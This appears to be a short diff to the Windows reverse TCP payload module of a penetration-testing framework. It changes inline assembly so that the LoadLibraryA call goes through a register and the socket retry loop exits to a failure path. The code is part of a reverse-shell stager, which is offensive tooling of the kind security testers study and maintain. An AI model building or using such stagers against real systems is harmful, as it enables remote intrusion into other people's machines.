@@ -125,7 +125,8 @@ module Payload::Windows::ReverseTcp
         push 'ws2_'             ; ...
         push esp                ; Push a pointer to the "ws2_32" string on the stack.
         push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
-        call ebp                ; LoadLibraryA( "ws2_32" )
+        mov eax, ebp
+        call eax                ; LoadLibraryA( "ws2_32" )
 
         mov eax, 0x0190         ; EAX = sizeof( struct WSAData )
         sub esp, eax            ; alloc some space for the WSAData structure
@@ -298,7 +299,8 @@ module Payload::Windows::ReverseTcp
         dec [esp]               ; decrement the counter
 
         ; try again
-        jmp create_socket
+        jnz create_socket
+        jmp failure
       ^
     end
 
